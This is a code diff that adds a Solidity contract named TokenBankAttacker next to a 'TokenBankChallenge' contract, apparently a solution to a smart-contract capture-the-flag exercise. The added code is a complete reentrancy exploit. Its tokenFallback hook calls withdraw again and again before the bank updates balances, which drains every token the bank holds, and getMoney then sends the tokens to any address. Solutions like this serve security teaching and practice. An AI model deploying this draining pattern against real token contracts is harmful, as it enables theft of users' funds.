@@ -124,3 +124,44 @@ contract TokenBankChallenge {
         balanceOf[msg.sender] -= amount;
     }
 }
+
+
+contract TokenBankAttacker {
+    TokenBankChallenge private bankContract;
+    SimpleERC223Token private tokenContract;
+
+    function TokenBankAttacker(address _bankContract, address _tokenContract) public {
+        bankContract = TokenBankChallenge(_bankContract);
+        tokenContract = SimpleERC223Token(_tokenContract);
+    }
+
+    function tokenFallback(
+        address from,
+        uint256 value,
+        bytes
+    ) public {
+        if (from != address(bankContract)) return;
+        withdraw();
+    }
+
+    function deposit() public {
+        bankContract.token().transfer(address(bankContract), 500000 * 10**18);
+    }
+
+    function withdraw() public {
+        uint256 myInitialBalance = bankContract.balanceOf(address(this));
+        uint256 challengeTotalRemainingBalance = bankContract.token().balanceOf(address(bankContract));
+        bool keepRecursing = challengeTotalRemainingBalance > 0;
+
+        if (keepRecursing) {
+            uint256 toWithdraw = myInitialBalance < challengeTotalRemainingBalance
+                ? myInitialBalance
+                : challengeTotalRemainingBalance;
+            bankContract.withdraw(toWithdraw);
+        }
+    }
+
+    function getMoney(address withdrawer) public {
+        tokenContract.transfer(withdrawer, tokenContract.balanceOf(address(this)));
+    }
+}
